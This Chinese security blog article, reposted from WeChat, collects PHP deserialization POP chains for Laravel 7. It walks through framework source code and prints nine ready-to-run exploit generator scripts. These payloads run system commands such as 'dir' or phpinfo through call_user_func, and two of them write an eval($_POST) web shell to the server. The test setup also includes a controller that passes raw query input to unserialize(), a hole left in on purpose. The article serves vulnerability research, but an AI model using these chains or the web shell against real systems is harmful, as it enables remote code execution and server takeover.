> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/uVQh6HGfwBqEqsW5hF1mEg)

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb5jCFlQQwcNkNbyRCWcYufuzxQQZB6VfLbPibQFFxy02MsMLAwgf4T1Br9ibnpXgJLAeadYEqQLLrXg/640?wx_fmt=png)

laravel7 反序列化汇总

![](https://mmbiz.qpic.cn/mmbiz_png/ldFaBNSkvHiawuXdB6ia3xLsxlibDoIxR7k2R17hzg44wneSzevDFLn4uDxWBV0tlc3y4q2EybTK1hEJ1O7qF0TGw/640?wx_fmt=png)

测试使用的 Laravel 是通过 composer 默认方法 composer create-project --prefer-dist laravel/laravel blog "7.12.*" 安装的，如果用到了未默认带的组件会在文中说明 !

安装好后在 routes\web.php 添加路由

```
Route::get('/index', "IndexController@index");

```

然后在 app\Http\Controllers 目录下添加 IndexController.php

```
<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;

class IndexController extends Controller
{
    public function index(Request $request)
{
        if ($request->query("data")) {
            unserialize($request->query("data"));
        } else {
            highlight_file(__FILE__);
            return "Laravel version: " . app()::VERSION;
        }
    }
}

```

php artisan serve 启动服务。

POP 链 1*

![](https://mmbiz.qpic.cn/mmbiz_png/ldFaBNSkvHiawuXdB6ia3xLsxlibDoIxR7k2R17hzg44wneSzevDFLn4uDxWBV0tlc3y4q2EybTK1hEJ1O7qF0TGw/640?wx_fmt=png)

把 laravel5 的反序列化基本过了以后在 phpggc 的 laravel 反序列库里面找了一个通过修改参数使用的 php 反序列化点, 主要是通过 RCE3 展开的一次任意命令执行攻击, 然后仍可以应用于 laravel7

应用了 PendingBroadcast 类这个反序列化点

```
public function __destruct()
{
        $this->events->dispatch($this->event);
    }

```

参数都可控, 那就行了, 触发__call() 函数就行, 在 Illuminate\Notifications\ChannelManager

```
public function __call($method, $parameters)
{
    return $this->driver()->$method(...$parameters);
}

```

跟进 driver() 方法

```
public function driver($driver = null)
{
    $driver = $driver ?: $this->getDefaultDriver();

    if (is_null($driver)) {
        throw new InvalidArgumentException(sprintf(
            'Unable to resolve NULL driver for [%s].', static::class
        ));
    }

    // If the given driver has not been created before, we will create the instances
    // here and cache it so we can return it next time very quickly. If there is
    // already a driver created by this name, we'll just return that instance.
    if (! isset($this->drivers[$driver])) {
        $this->drivers[$driver] = $this->createDriver($driver);
    }

    return $this->drivers[$driver];
}

```

getDefaultDriver 方法实现在子类 Manager

```
public function getDefaultDriver()
{
    return $this->defaultChannel;
}

```

$this->defaultChannel 的值是我们可控的，比如是 null，然后继续回到 driver 方法中，$this->drivers 我们可控，使其进入 createDriver 方法

```
protected function createDriver($driver)
{
    // We'll check to see if a creator method exists for the given driver. If not we
    // will check for a custom driver creator, which allows developers to create
    // drivers using their own customized driver creator Closure to create it.
    if (isset($this->customCreators[$driver])) {
        return $this->callCustomCreator($driver);
    } else {
        $method = 'create'.Str::studly($driver).'Driver';


        if (method_exists($this, $method)) {
            return $this->$method();
        }
    }
    throw new InvalidArgumentException("Driver [$driver] not supported.");
}

```

因为这里 $customCreators 是我们可控的，所以使 if 语句成立，进入 callCustomCreator 方法

```
protected function callCustomCreator($driver)
{
    return $this->customCreators[$driver]($this->container);
}

```

这里所有参数均可控可以造成 RCE , 然后构建 pop 链如下, 暂时只能传一个参数

```
<?php

/*
# -*- coding: utf-8 -*-
# @filename: laravel 7 RCE poc1
# @author: Ricky
*/

namespace Illuminate\Broadcasting {
    class PendingBroadcast {
        protected $events;
        protected $event;
        public function __construct($events) {
            $this->events = $events;
        }
    }
}
// $this->events->dispatch($this->event);

namespace Illuminate\Notifications
{
    class ChannelManager
    {
        protected $container;
        protected $defaultChannel;
        protected $customCreators;

        function __construct($function, $parameter)
{
            $this->container = $parameter;
            $this->customCreators = ['x' => $function];
            $this->defaultChannel = 'x';
        }
    }
}

namespace {

    use Illuminate\Broadcasting\PendingBroadcast;
    use Illuminate\Notifications\ChannelManager;

    $b = new ChannelManager('system', 'dir');
    $a = new PendingBroadcast($b);
    echo urlencode(serialize($a));
}

```

然后 GET 传参 ?data= 反序列化成功

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb5jCFlQQwcNkNbyRCWcYufuKUoiahebLakIg1xknvecP3oOvVJX2mnC9sVtKgbn9fphzcV43DSSB0A/640?wx_fmt=png)

POP 链 2*

![](https://mmbiz.qpic.cn/mmbiz_png/ldFaBNSkvHiawuXdB6ia3xLsxlibDoIxR7k2R17hzg44wneSzevDFLn4uDxWBV0tlc3y4q2EybTK1hEJ1O7qF0TGw/640?wx_fmt=png)

新思路: 紧接 POP 链 1, 既然只能传一个参数, 就想到了之前 Yii2 反序列化的类函数调用, 调用 public function 下包含 file_put_contents 且参数可控, 那么这样也就是

```
return $this->customCreators[$driver]($this->container);
// call_user_func['x'](new class x(), 'x');

```

call_user_func 传一个参数, 这个参数就是回调函数, 回调的时候访问该类中的其它函数执行, 但是该函数不可以包含任何形参且是 public (protected 和 private 自己自己调用), 也就是形成了调用其它类里不包含形参的任何方法

花了挺长时间的找这个, 在 Illuminate\Auth\RequestGuard.php 中

```
public function user()
{
        // If we've already retrieved the user for the current request we can just
        // return it back immediately. We do not want to fetch the user data on
        // every call to this method because that would be tremendously slow.
        if (! is_null($this->user)) {
            return $this->user;
        }

        return $this->user = call_user_func(
            $this->callback, $this->request, $this->getProvider()
        );
    }

```

这个堪称完美, 参数均可控而且我们可以进行二次调用, 这一次我们可以多传两个参数 (也就是 file_put_contents 有可能实现了), 于是全局搜索 public function 包含 file_put_contents 的, 也花了挺久, 在 Illuminate\Filesystem\Filesystem.php 中

```
public function append($path, $data)
{
        return file_put_contents($path, $data, FILE_APPEND);
    }

```

又是一个堪称完美的函数, 参数均可控而且调用就直接写入文件, 快狠准! (FILE_APPEND 表示可追加写入)

那新的 pop 链就成型了, 这里做个整体总结

```
class PendingBroadcast -> __destruct()
↓↓↓
class ChannelManager -> call() -> driver()
↓↓↓
abstract class Manager -> getDefaultDrive()
↓↓↓
class ChannelManager -> createDriver()
↓↓↓
class ChannelManager -> callCustomCreator()
↓↓↓
class RequestGuard -> user() -> call_user_func()
↓↓↓
class Filesystem -> append() -> file_put_contents()
↓↓↓
剩下就是其它的一些无关紧要的调用

```

建立 exp.php

```
<?php

/*
# -*- coding: utf-8 -*-
# @filename: laravel 7 RCE poc2
# @author: Ricky
# @ability: upload shell
*/

namespace Illuminate\Broadcasting {
    class PendingBroadcast {
        protected $events;
        protected $event;
        public function __construct($events) {
            $this->events = $events;
        }
    }
}
// $this->events->dispatch($this->event);

namespace Illuminate\Notifications
{
    class ChannelManager
    {
        protected $container;
        protected $defaultChannel;
        protected $customCreators;

        function __construct($function, $parameter)
{
            $this->container = $parameter;
            $this->customCreators = ['x' => $function];
            $this->defaultChannel = 'x';
        }
    }
}

namespace Illuminate\Filesystem {
    class Filesystem{
        public $path = 'ricky.php';
        public $data = '<?php eval($_POST[ricky]);?>';
    }
}

namespace Illuminate\Auth {
    class RequestGuard {
        protected $user;
        protected $callback;
        protected $request = 'ricky.php';
        protected $provider = '<?php eval($_POST[ricky]);?>';
        public function __construct($callback) {
            $this->callback = $callback;
        }
    }
}

namespace {

    use Illuminate\Auth\RequestGuard;
    use Illuminate\Filesystem\Filesystem;
    use Illuminate\Notifications\ChannelManager;
    use Illuminate\Broadcasting\PendingBroadcast;

    $c = new RequestGuard([new Filesystem(), 'append']);
    $b = new ChannelManager('call_user_func', [$c, 'user']);
    $a = new PendingBroadcast($b);
    echo urlencode(serialize($a));
}

```

反序列化成功

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb5jCFlQQwcNkNbyRCWcYufuwkB5a1lYb4jbcpoc0AQKq1iaJA5rRBC3IoPORicTsuRGLn6HqA13O8tg/640?wx_fmt=png)

补充: 全局搜索 __destruct() 来找到新的可以触发 __call 函数的点, 于是找到了有三个类好用

```
# PendingResourceRegistration
    public function __destruct()
{
        if (! $this->registered) {
            $this->register();
        }
    }
# CollectionConfigurator
    public function __destruct()
{
        if (null === $this->prefixes) {
            $this->collection->addPrefix($this->route->getPath());
        }
        if (null !== $this->host) {
            $this->addHost($this->collection, $this->host);
        }

        $this->parent->addCollection($this->collection);
    }
# ImportConfigurator
    public function __destruct()
{
        $this->parent->addCollection($this->route);
    }

```

首先谈一下 ImportConfigurator 类, 其实我一开始最想用的就是这个, 简单而且和 PendingBroadcast 类的 __destruct() 长得特别像, 参数均可控, 但是本地开 debug 调试后提示这个类不能被反序列化就舍弃了, 有用成的师傅可以分享一下心得

其次就是 CollectionConfigurator 类, 也是和上面反馈了一样的情况, 不让反序列化, 所以就只剩下 PendingResourceRegistration 类了, 亲测可用, 然后先跟进函数 register()

```
public function register()
{
        $this->registered = true;

        return $this->registrar->register(
            $this->name, $this->controller, $this->options
        );
    }

```

这些参数都可控, 那就行了, 触发__call() 函数就行, 剩余步骤就不详细分析了, 直接给出 POP 链 1 和 POP 链 2 的翻新

```
<?php

/*
# -*- coding: utf-8 -*-
# @filename: laravel 7 RCE poc3
# @author: Ricky
*/

namespace Illuminate\Routing{
    class PendingResourceRegistration{
        protected $registrar;
        protected $name;
        protected $controller;
        protected $options;
        public function __construct($registrar, $name, $controller, $options)
{
            $this->registrar = $registrar;
            $this->name = $name;
            $this->controller = $controller;
            $this->options = $options;
        }
    }
}

namespace Illuminate\Notifications
{
    class ChannelManager
    {
        protected $container;
        protected $defaultChannel;
        protected $customCreators;

        function __construct($function, $parameter)
{
            $this->container = $parameter;
            $this->customCreators = ['x' => $function];
            $this->defaultChannel = 'x';
        }
    }
}

namespace {

    use Illuminate\Notifications\ChannelManager;
    use Illuminate\Routing\PendingResourceRegistration;

    $b = new ChannelManager('phpinfo', '-1');
    $a = new PendingResourceRegistration($b, 'ricky', 'ricky', 'ricky');
    echo urlencode(serialize($a));
}

```

上传 shell 的 POP 链

```
<?php

/*
# -*- coding: utf-8 -*-
# @filename: laravel 7 RCE poc4
# @author: Ricky
# @ability: upload shell
*/

namespace Illuminate\Routing{
    class PendingResourceRegistration{
        protected $registrar;
        protected $name;
        protected $controller;
        protected $options;
        public function __construct($registrar, $name, $controller, $options)
{
            $this->registrar = $registrar;
            $this->name = $name;
            $this->controller = $controller;
            $this->options = $options;
        }
    }
}

namespace Illuminate\Notifications
{
    class ChannelManager
    {
        protected $container;
        protected $defaultChannel;
        protected $customCreators;

        function __construct($function, $parameter)
{
            $this->container = $parameter;
            $this->customCreators = ['x' => $function];
            $this->defaultChannel = 'x';
        }
    }
}

namespace Illuminate\Filesystem {
    class Filesystem{
        public $path = 'ricky.php';
        public $data = '<?php eval($_POST[ricky]);?>';
    }
}

namespace Illuminate\Auth {
    class RequestGuard {
        protected $user;
        protected $callback;
        protected $request = 'ricky.php';
        protected $provider = '<?php eval($_POST[ricky]);?>';
        public function __construct($callback) {
            $this->callback = $callback;
        }
    }
}

namespace {

    use Illuminate\Auth\RequestGuard;
    use Illuminate\Filesystem\Filesystem;
    use Illuminate\Notifications\ChannelManager;
    use Illuminate\Routing\PendingResourceRegistration;

    $c = new RequestGuard([new Filesystem(), 'append']);
    $b = new ChannelManager('call_user_func', [$c, 'user']);
    $a = new PendingResourceRegistration($b, 'ricky', 'ricky', 'ricky');
    echo urlencode(serialize($a));
}

```

POP 链 3

![](https://mmbiz.qpic.cn/mmbiz_png/ldFaBNSkvHiawuXdB6ia3xLsxlibDoIxR7k2R17hzg44wneSzevDFLn4uDxWBV0tlc3y4q2EybTK1hEJ1O7qF0TGw/640?wx_fmt=png)

入口类: Illuminate\Broadcasting\pendiongBroadcast

最后 RCE 调用类：Illuminate\Bus\Dispatcher

一开始使用 __destruct() 函数直接跟进到 dispatch 方法

```
public function dispatch($command)
{
        if ($this->queueResolver && $this->commandShouldBeQueued($command)) {
            return $this->dispatchToQueue($command);
        }

        return $this->dispatchNow($command);
    }

```

跟进一下 dispatchToQueue() 方法

```
 public function dispatchToQueue($command)
{
        $connection = $command->connection ?? null;

        $queue = call_user_func($this->queueResolver, $connection);

        if (! $queue instanceof Queue) {
            throw new RuntimeException('Queue resolver did not return a Queue implementation.');
        }

        if (method_exists($command, 'queue')) {
            return $command->queue($queue, $command);
        }

        return $this->pushCommandToQueue($queue, $command);
    }

```

发现 call_user_func , 想办法利用, $this->queueResolver 和 $connection 都可控, 返回 dispatch 跟进一下 commandShouldBeQueued

```
protected function commandShouldBeQueued($command)
{
        return $command instanceof ShouldQueue;
    }

```

需要 $command 是一个实现了 ShouldQueue 接口的对象，全局搜索一下，还挺多的，随便找一个用就可以了，这里用的是 QueuedCommand 类。这样就 if 判断成功，进入 dispatchToQueue() , 然后就可以利用了, POP 链就形成了

```
<?php

/*
# -*- coding: utf-8 -*-
# @filename: laravel 7 RCE poc5
# @author: Ricky
*/

namespace Illuminate\Broadcasting{
    class PendingBroadcast {
        protected $events;
        protected $event;
        public function __construct($events, $event) {
            $this->events=$events;
            $this->event=$event;
        }
    }
}

namespace Illuminate\Foundation\Console {
    class QueuedCommand {
        public $connection;
        public function __construct($connection) {
            $this->connection = $connection;
        }
    }
}

namespace Illuminate\Bus {
    class Dispatcher {
        protected $queueResolver;
        public function __construct($queueResolver) {
            $this->queueResolver = $queueResolver;
        }
    }
}

namespace {
    $c = new Illuminate\Bus\Dispatcher('system');
    $b = new Illuminate\Foundation\Console\QueuedCommand('dir');
    $a = new Illuminate\Broadcasting\PendingBroadcast($c, $b);
    echo urlencode(serialize($a));
}

```

反序列化成功

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb5jCFlQQwcNkNbyRCWcYufubbOibsNT28a0HHkkPXK8JeoBG0qR0g1ItVzWD5364iaHrDQxPKTKFcMA/640?wx_fmt=png)

然后利用其它的也可以 (把 laravel 7 所有的继承 ShouldQueue 接口的都列出来了)

*   **exp 1**
    

```
<?php

/*
# -*- coding: utf-8 -*-
# @filename: laravel 7 RCE poc6
# @author: Ricky
*/

namespace Illuminate\Broadcasting{
    class PendingBroadcast {
        protected $events;
        protected $event;
        public function __construct($events, $event) {
            $this->events=$events;
            $this->event=$event;
        }
    }
}

namespace Illuminate\Broadcasting {
    class BroadcastEvent {
        public $connection;
        public function __construct($connection) {
            $this->connection = $connection;
        }
    }
}

namespace Illuminate\Bus {
    class Dispatcher {
        protected $queueResolver;
        public function __construct($queueResolver) {
            $this->queueResolver = $queueResolver;
        }
    }
}

namespace {
    $c = new Illuminate\Bus\Dispatcher('system');
    $b = new Illuminate\Broadcasting\BroadcastEvent('dir');
    $a = new Illuminate\Broadcasting\PendingBroadcast($c, $b);
    echo urlencode(serialize($a));
}

```

*   **exp 2**
    

```
<?php

/*
# -*- coding: utf-8 -*-
# @filename: laravel 7 RCE poc7
# @author: Ricky
*/

namespace Illuminate\Broadcasting{
    class PendingBroadcast {
        protected $events;
        protected $event;
        public function __construct($events, $event) {
            $this->events=$events;
            $this->event=$event;
        }
    }
}

namespace Illuminate\Notifications {
    class SendQueuedNotifications {
        public $connection;
        public function __construct($connection) {
            $this->connection = $connection;
        }
    }
}

namespace Illuminate\Bus {
    class Dispatcher {
        protected $queueResolver;
        public function __construct($queueResolver) {
            $this->queueResolver = $queueResolver;
        }
    }
}

namespace {
    $c = new Illuminate\Bus\Dispatcher('system');
    $b = new Illuminate\Notifications\SendQueuedNotifications('dir');
    $a = new Illuminate\Broadcasting\PendingBroadcast($c, $b);
    echo urlencode(serialize($a));
}

```

*   **exp 3**
    

```
<?php

/*
# -*- coding: utf-8 -*-
# @filename: laravel 7 RCE poc8
# @author: Ricky
*/

namespace Illuminate\Broadcasting{
    class PendingBroadcast {
        protected $events;
        protected $event;
        public function __construct($events, $event) {
            $this->events=$events;
            $this->event=$event;
        }
    }
}

namespace Illuminate\Queue {
    class CallQueuedClosure {
        public $connection;
        public function __construct($connection) {
            $this->connection = $connection;
        }
    }
}

namespace Illuminate\Bus {
    class Dispatcher {
        protected $queueResolver;
        public function __construct($queueResolver) {
            $this->queueResolver = $queueResolver;
        }
    }
}

namespace {
    $c = new Illuminate\Bus\Dispatcher('system');
    $b = new Illuminate\Queue\CallQueuedClosure('dir');
    $a = new Illuminate\Broadcasting\PendingBroadcast($c, $b);
    echo urlencode(serialize($a));
}

```

*   **exp 4**
    

```
<?php

/*
# -*- coding: utf-8 -*-
# @filename: laravel 7 RCE poc9
# @author: Ricky
*/

namespace Illuminate\Broadcasting{
    class PendingBroadcast {
        protected $events;
        protected $event;
        public function __construct($events, $event) {
            $this->events=$events;
            $this->event=$event;
        }
    }
}

namespace Illuminate\Events {
    class CallQueuedListener {
        public $connection;
        public function __construct($connection) {
            $this->connection = $connection;
        }
    }
}

namespace Illuminate\Bus {
    class Dispatcher {
        protected $queueResolver;
        public function __construct($queueResolver) {
            $this->queueResolver = $queueResolver;
        }
    }
}

namespace {
    $c = new Illuminate\Bus\Dispatcher('system');
    $b = new Illuminate\Events\CallQueuedListener('dir');
    $a = new Illuminate\Broadcasting\PendingBroadcast($c, $b);
    echo urlencode(serialize($a));
}

```

总结

![](https://mmbiz.qpic.cn/mmbiz_png/ldFaBNSkvHiawuXdB6ia3xLsxlibDoIxR7k2R17hzg44wneSzevDFLn4uDxWBV0tlc3y4q2EybTK1hEJ1O7qF0TGw/640?wx_fmt=png)

相比 laravel 5.8, 可以利用的反序列化链变少了, 但是核心思路没有变, 还是通过 __destruct() 触发 __call 或者 __invoke 函数, 再通过 call_user_func 或 call_user_func_array 进行函数回调达成 RCE

```
- End -


精彩推荐

【技术分享】手把手教你构建vcpkg私有仓库


【技术分享】Gafgyt变种-Jaws僵尸网络的分析报告


【技术分享】透过挑战题教你解析Excel 4.0宏

戳“阅读原文”查看更多内容

```